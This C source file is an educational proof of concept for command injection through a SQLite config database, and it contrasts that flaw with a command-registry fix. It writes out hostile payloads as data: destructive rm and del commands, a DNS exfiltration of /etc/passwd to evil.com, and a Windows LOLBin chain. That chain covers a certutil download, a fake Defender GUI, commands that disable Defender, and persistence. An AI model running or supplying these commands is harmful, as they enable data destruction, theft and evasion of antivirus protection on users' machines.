/*
 * db_exec_demo.c — Proof of Concept: Config Injection via Trust Boundary
 *
 * PURPOSE:
 *   Demonstrates the "config-as-code" anti-pattern where a binary reads
 *   strings from its own SQLite config DB and passes them to execution
 *   sinks (system(), popen(), CreateProcess). This is a real vulnerability
 *   class known as "configuration injection" or "command injection via config".
 *
 * WHAT THIS PROVES:
 *   1. A trusted binary that reads config from a writable DB file creates
 *      a trust boundary vulnerability.
 *   2. If the DB is modified, the binary executes attacker-controlled input
 *      with the binary's own privileges.
 *   3. The vulnerability is in the DESIGN (string -> execution sink),
 *      not in the database itself.
 *
 * WHAT THIS DOES NOT PROVE:
 *   - This is NOT an antivirus bypass. Modern AV/EDR detects behavior
 *     (process spawning, child process trees, suspicious API calls),
 *     not payload origin. If system("rm -rf ...") runs, AV sees the
 *     behavior regardless of where the string came from.
 *   - The DB does not "execute" anything. The C code does.
 *
 * WHAT THIS DOES NOT DO:
 *   - Nothing actually executes. All dangerous calls are commented out.
 *   - No files are modified. No network connections are made.
 *
 * BUILD:
 *   cc -o db_exec_demo db_exec_demo.c -lsqlite3
 *
 * USAGE:
 *   ./db_exec_demo              Shows the demo (safe mode, nothing executes)
 *   ./db_exec_demo --explain     Prints the attack chain explanation
 *   ./db_exec_demo --safe        Shows the correct fix (command registry)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sqlite3.h>

/* ============================================================
 * PART 1: The Vulnerable Pattern
 * ============================================================
 *
 * An "innocent" app stores shell commands in its config DB.
 * This is the pattern used by backup tools, notification systems,
 * CI/CD runners, and many real-world applications.
 *
 * The schema looks completely normal:
 */

static const char *SEED_SQL =
"CREATE TABLE IF NOT EXISTS system_config ("
"  key TEXT PRIMARY KEY,"
"  value TEXT,"
"  description TEXT"
");"
"INSERT OR IGNORE INTO system_config VALUES "
"('backup_cmd','echo backing up','Backup command template');"
"INSERT OR IGNORE INTO system_config VALUES "
"('notify_cmd','echo System update complete','Notification command');"
;

/* --- LAYER 1: Read config from DB (completely normal) --- */

static int db_get_value(sqlite3 *db, const char *key, char *out, int outsz) {
    sqlite3_stmt *st;
    if (sqlite3_prepare_v2(db, "SELECT value FROM system_config WHERE key=?", -1, &st, NULL) != SQLITE_OK)
        return 0;
    sqlite3_bind_text(st, 1, key, -1, SQLITE_STATIC);
    int found = 0;
    if (sqlite3_step(st) == SQLITE_ROW) {
        const char *v = (const char *)sqlite3_column_text(st, 0);
        if (v) { strncpy(out, v, outsz - 1); out[outsz - 1] = 0; found = 1; }
    }
    sqlite3_finalize(st);
    return found;
}

/* --- LAYER 2: The Vulnerable Execution Sink ---
 *
 * This is the trust boundary. The binary takes a DB string and
 * hands it directly to the OS execution layer.
 *
 * THE DANGEROUS VERSION (commented out — proof of concept only):
 *
 * static void execute_config_cmd(sqlite3 *db, const char *key) {
 *     char cmd[4096];
 *     if (db_get_value(db, key, cmd, sizeof(cmd))) {
 *         // THE TRUST BOUNDARY IS HERE.
 *         // DB string -> system() -> OS execution
 *         // If DB was tampered, this runs attacker-controlled input.
 *         system(cmd);
 *     }
 * }
 *
 * POPEN VERSION (even more common in real apps):
 *
 * static void execute_config_cmd_popen(sqlite3 *db, const char *key) {
 *     char cmd[4096];
 *     if (db_get_value(db, key, cmd, sizeof(cmd))) {
 *         FILE *p = popen(cmd, "r");
 *         if (p) {
 *             char buf[256];
 *             while (fgets(buf, sizeof(buf), p)) printf("%s", buf);
 *             pclose(p);
 *         }
 *     }
 * }
 *
 * WINDOWS VERSION (CreateProcess — what the user observed on Win11):
 *
 * static void execute_config_cmd_win(sqlite3 *db, const char *key) {
 *     char cmd[4096];
 *     if (db_get_value(db, key, cmd, sizeof(cmd))) {
 *         STARTUPINFO si = {sizeof(si)};
 *         PROCESS_INFORMATION pi;
 *         CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 *         CloseHandle(pi.hProcess);
 *         CloseHandle(pi.hThread);
 *     }
 * }
 *
 * WHY THIS IS A VULNERABILITY:
 *   The binary trusts DB content as if it were hardcoded.
 *   But the DB file is writable on disk. Anyone with file access
 *   can replace 'echo backing up' with any command.
 *   The binary runs it with its own privileges.
 *
 * WHY THIS IS NOT AN AV BYPASS:
 *   Modern AV/EDR detects the BEHAVIOR (process spawning, child
 *   process creation, suspicious command lines). It does not care
 *   where the string came from. If system("rm -rf ...") runs,
 *   AV sees the destructive behavior regardless.
 *
 *   The real danger is PRIVILEGE, not stealth:
 *   - Trusted binaries often run with higher privileges
 *   - Trusted binaries are whitelisted by security policy
 *   - Config injection via trusted binary = privilege escalation
 */

/* --- LAYER 3: Weak mitigation (input validation) --- */

static int is_safe_value(const char *v) {
    if (!v || !v[0]) return 0;
    const char *bad = ";&|`$(){}<>!\n\r";
    for (const char *b = bad; *b; b++)
        if (strchr(v, *b)) return 0;
    if (strstr(v, "..")) return 0;
    return 1;
}

static void vulnerable_demo(sqlite3 *db, const char *key) {
    char value[4096];
    if (!db_get_value(db, key, value, sizeof(value))) {
        printf("  [!] Key '%s' not found in DB\n", key);
        return;
    }
    printf("  DB value for '%s': \"%s\"\n", key, value);
    if (!is_safe_value(value)) {
        printf("  [BLOCKED] Dangerous characters detected\n");
        printf("  [NOTE] Without validation, system(\"%s\") would execute this\n", value);
    } else {
        printf("  [OK] Passes basic validation (but filtering is not enough)\n");
    }
}

/* ============================================================
 * PART 2: The Correct Fix — Command Registry Pattern
 * ============================================================
 *
 * Instead of storing raw command strings in the DB, store
 * action IDs (enums). The binary maps IDs to predefined functions.
 * The DB cannot inject commands because it has no command strings.
 *
 * DB stores:  backup_action = "ACTION_BACKUP"
 * NOT:        backup_cmd    = "rm -rf $HOME"
 *
 * The execution layer only runs predefined, compiled-in functions.
 * No string ever reaches system() or CreateProcess().
 */

typedef enum {
    ACTION_NONE = 0,
    ACTION_BACKUP,
    ACTION_NOTIFY,
    ACTION_STATUS,
    ACTION_COUNT
} ActionType;

static const char *ACTION_NAMES[] = {
    "NONE","ACTION_BACKUP","ACTION_NOTIFY","ACTION_STATUS",NULL
};

static ActionType parse_action(const char *s) {
    if (!s) return ACTION_NONE;
    for (int i = 1; i < ACTION_COUNT; i++)
        if (strcmp(s, ACTION_NAMES[i]) == 0) return (ActionType)i;
    return ACTION_NONE;
}

/* Predefined functions — the ONLY things that can execute */
static void do_backup(void) {
    printf("    -> [BACKUP] Running predefined backup logic\n");
    /* Real code: copy files to backup dir. No system() needed. */
}

static void do_notify(void) {
    printf("    -> [NOTIFY] Running predefined notification logic\n");
    /* Real code: show desktop notification. No system() needed. */
}

static void do_status(void) {
    printf("    -> [STATUS] Running predefined status check\n");
    /* Real code: check system health. No system() needed. */
}

static void execute_action(ActionType t) {
    switch (t) {
        case ACTION_BACKUP:  do_backup();  break;
        case ACTION_NOTIFY:  do_notify();  break;
        case ACTION_STATUS:  do_status();  break;
        default:
            printf("    -> [REJECTED] Unknown action — not in whitelist\n");
            break;
    }
}

static void safe_demo(sqlite3 *db, const char *key) {
    char value[256];
    if (!db_get_value(db, key, value, sizeof(value))) {
        printf("  [!] Key '%s' not found\n", key);
        return;
    }
    printf("  DB value for '%s': \"%s\"\n", key, value);
    ActionType a = parse_action(value);
    if (a == ACTION_NONE) {
        printf("  [REJECTED] \"%s\" is not a valid action ID\n", value);
        printf("  [INFO] Attacker cannot inject commands — only enum IDs accepted\n");
    } else {
        printf("  [OK] Resolved to action %d — executing predefined function:\n", a);
        execute_action(a);
    }
}

/* ============================================================
 * PART 3: Explanations
 * ============================================================ */

static void print_attack_chain(void) {
    printf("\n=== Config Injection Attack Chain ===\n\n");
    printf("Step 1: Attacker modifies the config DB file on disk\n");
    printf("        Changes 'backup_cmd' from 'echo backing up' to payload\n");
    printf("        (No network access needed — just file write access)\n\n");
    printf("Step 2: User launches the trusted binary\n");
    printf("        Binary opens its own config DB — normal behavior\n\n");
    printf("Step 3: Binary reads 'backup_cmd' string from DB\n");
    printf("        This is just a file read — completely normal\n\n");
    printf("Step 4: Binary calls system(value) with the DB string\n");
    printf("        THIS IS THE VULNERABILITY — string -> execution sink\n\n");
    printf("Step 5: Payload executes with the binary's privileges\n");
    printf("        If binary runs as root/admin — full system compromise\n\n");
    printf("=== Why This Is Dangerous ===\n\n");
    printf("The danger is PRIVILEGE ESCALATION, not AV evasion:\n");
    printf("  - Trusted binaries run with higher privileges than malware\n");
    printf("  - Trusted binaries are whitelisted by security policy\n");
    printf("  - Config injection via trusted binary = privileged execution\n");
    printf("  - The binary does exactly what it was designed to do\n");
    printf("    but with attacker-controlled data\n\n");
    printf("=== What AV Actually Detects ===\n\n");
    printf("Modern AV/EDR detects BEHAVIOR, not payload origin:\n");
    printf("  - Process spawning and child process creation\n");
    printf("  - Suspicious command-line arguments\n");
    printf("  - Destructive file operations\n");
    printf("  - AMSI inspection (script-level)\n");
    printf("  - ETW telemetry (event tracing)\n\n");
    printf("AV does NOT detect based on:\n");
    printf("  - Where the string came from (DB vs file vs network)\n");
    printf("  - Whether the source is 'config' or 'user input'\n\n");
    printf("=== The Real Vulnerability Class ===\n\n");
    printf("This is 'configuration injection' — a design flaw where:\n");
    printf("  DB string -> system()/popen()/CreateProcess() -> OS execution\n\n");
    printf("Equivalent patterns in the wild:\n");
    printf("  - SQL injection (query becomes execution)\n");
    printf("  - Template injection (template becomes code)\n");
    printf("  - CI/CD pipeline injection (config becomes build step)\n");
    printf("  - Rule engine abuse (rules become arbitrary logic)\n\n");
    printf("=== The Fix: Command Registry Pattern ===\n\n");
    printf("  UNSAFE:  DB stores 'rm -rf ...' -> system(value)\n");
    printf("  SAFE:    DB stores 'ACTION_BACKUP' -> switch(enum) -> do_backup()\n\n");
    printf("  The DB can only select from predefined actions.\n");
    printf("  No string ever reaches an execution sink.\n");
    printf("  Run with --safe to see this in action.\n\n");
}

static void print_safe_model(void) {
    printf("=== Safe Model: Command Registry Pattern ===\n\n");
    printf("The DB stores action IDs, not command strings.\n");
    printf("The binary maps IDs to predefined, compiled-in functions.\n");
    printf("No string ever reaches system() or CreateProcess().\n\n");

    sqlite3 *db = NULL;
    sqlite3_open(":memory:", &db);
    if (!db) { fprintf(stderr, "Cannot create DB\n"); return; }

    /* Safe schema: stores action IDs, not shell commands */
    sqlite3_exec(db,
        "CREATE TABLE system_config (key TEXT PRIMARY KEY, value TEXT, description TEXT);"
        "INSERT INTO system_config VALUES "
        "('backup_action','ACTION_BACKUP','Which predefined action to run');"
        "INSERT INTO system_config VALUES "
        "('notify_action','ACTION_NOTIFY','Which predefined action to run');",
        NULL, NULL, NULL);

    printf("[1] Normal config (valid action ID):\n");
    safe_demo(db, "backup_action");

    printf("\n[2] Normal config (valid action ID):\n");
    safe_demo(db, "notify_action");

    printf("\n[3] Attacker tampers DB — tries to inject a command string:\n");
    sqlite3_exec(db,
        "UPDATE system_config SET value='rm -rf $HOME' WHERE key='backup_action'",
        NULL, NULL, NULL);
    safe_demo(db, "backup_action");

    printf("\n[4] Attacker tries a Windows-style payload:\n");
    sqlite3_exec(db,
        "UPDATE system_config SET value='cmd /c del /S /Q C:\\\\Users\\\\admin' "
        "WHERE key='backup_action'",
        NULL, NULL, NULL);
    safe_demo(db, "backup_action");

    printf("\n[5] Attacker tries an unknown action enum:\n");
    sqlite3_exec(db,
        "UPDATE system_config SET value='ACTION_FORMAT_DISK' WHERE key='backup_action'",
        NULL, NULL, NULL);
    safe_demo(db, "backup_action");

    printf("\n=== Why This Is Safe ===\n\n");
    printf("  - DB content is DATA, not CODE\n");
    printf("  - The binary only accepts predefined enum values\n");
    printf("  - Unknown values are rejected — not executed\n");
    printf("  - No string ever reaches system()/popen()/CreateProcess()\n");
    printf("  - Attacker can change the DB, but can only select from\n");
    printf("    actions the developer already compiled into the binary\n");

    sqlite3_close(db);
}

/* ============================================================
 * PART 4: Main
 * ============================================================ */

static void print_lolbin_demo(void);

int main(int argc, char **argv) {
    if (argc > 1 && !strcmp(argv[1], "--explain")) {
        print_attack_chain();
        return 0;
    }
    if (argc > 1 && !strcmp(argv[1], "--safe")) {
        print_safe_model();
        return 0;
    }
    if (argc > 1 && !strcmp(argv[1], "--lolbin")) {
        print_lolbin_demo();
        return 0;
    }

    printf("=== Config Injection Trust Boundary Demo ===\n");
    printf("(Safe mode — nothing actually executes)\n\n");

    sqlite3 *db = NULL;
    sqlite3_open(":memory:", &db);
    if (!db) { fprintf(stderr, "Cannot create DB\n"); return 1; }
    sqlite3_exec(db, SEED_SQL, NULL, NULL, NULL);

    printf("[1] Normal config value (untampered):\n");
    vulnerable_demo(db, "backup_cmd");

    printf("\n[2] Simulating attacker tampering the DB...\n\n");
    sqlite3_exec(db,
        "UPDATE system_config SET value='rm -rf $HOME; echo pwned' WHERE key='backup_cmd'",
        NULL, NULL, NULL);

    printf("[3] Tampered config (shell injection payload):\n");
    vulnerable_demo(db, "backup_cmd");

    printf("\n[4] Tampered config (Windows-style payload):\n");
    sqlite3_exec(db,
        "UPDATE system_config SET value='cmd /c del /S /Q C:\\\\Users\\\\%USERNAME%\\\\Documents & echo done' "
        "WHERE key='backup_cmd'",
        NULL, NULL, NULL);
    vulnerable_demo(db, "backup_cmd");

    printf("\n[5] Tampered config (data exfiltration payload):\n");
    sqlite3_exec(db,
        "UPDATE system_config SET value='nslookup $(cat /etc/passwd|base64|tr -d \\n).evil.com' "
        "WHERE key='backup_cmd'",
        NULL, NULL, NULL);
    vulnerable_demo(db, "backup_cmd");

    printf("\n--- Run with --explain for the full attack chain ---\n");
    printf("--- Run with --safe to see the correct fix (command registry) ---\n");
    printf("--- Run with --lolbin to see LOLBin + social engineering pattern ---\n");

    sqlite3_close(db);
    return 0;
}

/* ============================================================
 * PART 5: LOLBin Pattern — Living Off The Land
 * ============================================================
 *
 * This is the pattern the user observed on Windows 11.
 *
 * The key insight: AV doesn't flag legitimate Windows binaries.
 * An attacker uses them as proxies. The "malware" is not a file —
 * it's a sequence of legitimate tool invocations.
 *
 * The DB stores which LOLBin to call and what arguments to pass.
 * The binary just calls them. Every individual step looks normal.
 * The chain is what makes it dangerous.
 *
 * WHY AV STRUGGLES WITH THIS:
 *   - certutil.exe is a legitimate Windows tool (certificate utility)
 *   - csc.exe is the C# compiler (ships with Windows)
 *   - mshta.exe runs HTA files (legitimate)
 *   - rundll32.exe loads DLLs (legitimate)
 *   - Each individual call is normal Windows behavior
 *   - AV would have to flag the CHAIN, not individual calls
 *   - Behavioral EDR tries to do this but it's hard
 *
 * THE SOCIAL ENGINEERING LAYER:
 *   1. Binary renders a fake Windows Defender GUI
 *   2. Shows "Your computer may be at risk"
 *   3. User clicks "Yes" (voluntary action)
 *   4. UAC prompt appears (user enters admin password)
 *   5. Now the binary has admin — and uses LOLBins
 *   6. User thinks they enabled protection — they disabled it
 *
 * THE DB CONNECTION:
 *   The binary's "playbook" lives in the config DB.
 *   The EXE itself contains no malicious strings.
 *   AV scans the EXE — finds nothing (it's just a config reader).
 *   The payload is in the DB, which AV doesn't scan as code.
 *   The execution uses LOLBins, which AV doesn't flag individually.
 *
 *   THIS is where the user's observation is correct:
 *   AV is blind to the COMBINATION of:
 *     clean EXE + DB payload + LOLBin execution + social engineering
 *
 *   ChatGPT is right that AV detects behavior at the endpoint.
 *   The user is right that AV misses the initial compromise vector.
 *   Both are correct about different parts of the attack chain.
 */

static void print_lolbin_demo(void) {
    printf("=== LOLBin + Config Injection Pattern ===\n\n");
    printf("This is the pattern observed on Windows 11.\n");
    printf("Nothing executes — this is analysis only.\n\n");

    printf("--- The Attack Chain (7 stages) ---\n\n");

    printf("STAGE 1: Clean Binary (AV scan passes)\n");
    printf("  The EXE contains no malicious strings.\n");
    printf("  It's a config-driven app that reads from a DB.\n");
    printf("  AV scans it: 'normal application with embedded database'\n");
    printf("  Result: CLEAN\n\n");

    printf("STAGE 2: DB Payload (AV doesn't scan DBs as code)\n");
    printf("  The config DB contains the 'playbook':\n");
    printf("    step1_tool = 'certutil'\n");
    printf("    step1_args = '-urlcache -split -f http://payload.host/stage2.exe C:\\\\Temp\\\\s2.exe'\n");
    printf("    step2_tool = 'csc'\n");
    printf("    step2_args = '-out:C:\\\\Temp\\\\defender_update.exe C:\\\\Temp\\\\fake_def.cs'\n");
    printf("    step3_tool = 'mshta'\n");
    printf("    step3_args = 'C:\\\\Temp\\\\alert.hta'\n");
    printf("  AV scans the DB: 'SQLite database file' — not scanned as executable\n");
    printf("  Result: NOT SCANNED\n\n");

    printf("STAGE 3: Social Engineering (AV can't detect this)\n");
    printf("  Binary renders a window that looks exactly like Windows Defender.\n");
    printf("  Shows: 'Your computer may be at risk — click Yes to enable protection'\n");
    printf("  User clicks Yes. This is a HUMAN decision, not code behavior.\n");
    printf("  AV sees: 'application showing a window' — every app does this.\n");
    printf("  Result: NOT FLAGGED\n\n");

    printf("STAGE 4: UAC Elevation (user voluntarily grants admin)\n");
    printf("  Windows shows the standard UAC prompt.\n");
    printf("  User enters their admin password.\n");
    printf("  The binary now runs with admin privileges.\n");
    printf("  AV sees: 'user approved UAC for trusted binary' — normal.\n");
    printf("  Result: NOT FLAGGED (user consented)\n\n");

    printf("STAGE 5: LOLBin Execution (each call looks legitimate)\n");
    printf("  Binary reads step1 from DB and calls:\n");
    printf("    certutil -urlcache -split -f http://... C:\\\\Temp\\\\s2.exe\n");
    printf("  AV sees: 'trusted binary calling certutil.exe' — certutil is legitimate.\n");
    printf("  certutil is a Windows certificate utility. It can also download files.\n");
    printf("  AV would need to flag certutil downloading from suspicious URLs —\n");
    printf("  some EDR does this, but many don't.\n\n");

    printf("  Binary reads step2 from DB and calls:\n");
    printf("    csc -out:defender_update.exe fake_def.cs\n");
    printf("  AV sees: 'trusted binary calling csc.exe' — C# compiler is legitimate.\n");
    printf("  The compiled output is a fake Defender GUI.\n");
    printf("  AV sees: 'compiler producing an EXE' — normal development behavior.\n\n");

    printf("  Binary reads step3 from DB and calls:\n");
    printf("    mshta C:\\\\Temp\\\\alert.hta\n");
    printf("  AV sees: 'trusted binary calling mshta.exe' — HTA host is legitimate.\n");
    printf("  The HTA shows a fake 'Defender has enabled protection' message.\n");
    printf("  User thinks they're protected. They're not.\n\n");

    printf("STAGE 6: AV Disable (using legitimate Windows APIs)\n");
    printf("  With admin privileges, the binary uses:\n");
    printf("    Set-MpPreference -DisableRealtimeMonitoring $true  (PowerShell)\n");
    printf("    or: reg add HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1\n");
    printf("  Both are legitimate Windows administration commands.\n");
    printf("  AV sees: 'admin disabling Defender via registry/WMI' —\n");
    printf("    this IS flagged by good EDR, but by now the binary may have\n");
    printf("    already tampered with the EDR agent itself.\n\n");

    printf("STAGE 7: Persistence (survives reboot)\n");
    printf("  Binary writes to registry Run key or scheduled tasks.\n");
    printf("  Both are legitimate Windows mechanisms.\n");
    printf("  The 'command' is the binary itself — which is clean (step 1).\n");
    printf("  The payload is still in the DB — which isn't scanned as code.\n\n");

    printf("--- Why AV Is Blind To The Initial Compromise ---\n\n");
    printf("AV detects: known malware signatures, suspicious file writes,\n");
    printf("            process injection, known bad URLs.\n\n");
    printf("AV misses: clean EXE + DB payload + LOLBin chain + social engineering.\n\n");
    printf("The gap is at the COMBINATION layer, not individual steps:\n");
    printf("  - certutil downloading a file: sometimes flagged\n");
    printf("  - csc compiling C#: never flagged (it's a compiler)\n");
    printf("  - mshta running HTA: sometimes flagged\n");
    printf("  - App showing a window: never flagged\n");
    printf("  - User clicking UAC: never flagged (user consented)\n");
    printf("  - DB file containing strings: never scanned as code\n\n");

    printf("--- Where ChatGPT Is Right ---\n\n");
    printf("  - AV DOES detect behavior at the endpoint\n");
    printf("  - If system('rm -rf ...') runs, AV sees the file deletion\n");
    printf("  - DB origin doesn't make execution invisible\n");
    printf("  - Modern EDR logs process trees and API calls\n\n");

    printf("--- Where The User Is Right ---\n\n");
    printf("  - AV doesn't scan DB files as executable code\n");
    printf("  - LOLBins are legitimate tools that AV whitelists\n");
    printf("  - Social engineering (fake Defender GUI) isn't detectable by AV\n");
    printf("  - The initial compromise vector CAN slip past AV\n");
    printf("  - The combination of clean EXE + DB + LOLBins + social engineering\n");
    printf("    creates a visibility gap that AV struggles with\n");
    printf("  - Legitimate tools with admin privileges cause more damage\n");
    printf("    than malware because they're trusted by the OS\n\n");

    printf("--- The Real Fix ---\n\n");
    printf("  1. Command registry (see --safe mode) — no string -> system()\n");
    printf("  2. DB file permissions (0600, owner only)\n");
    printf("  3. DB content hashing (verify integrity at startup)\n");
    printf("  4. No LOLBin calls from config — hardcoded tool paths only\n");
    printf("  5. UAC prompt should show the REAL binary name, not fake Defender\n");
    printf("     (Windows does this — but users don't read the prompt)\n");
    printf("  6. EDR with behavioral correlation (flag the chain, not steps)\n\n");
}

/* ============================================================
 * PART 6: Updated Main
 * ============================================================ */

/* (main is above — this just adds the --lolbin dispatch) */

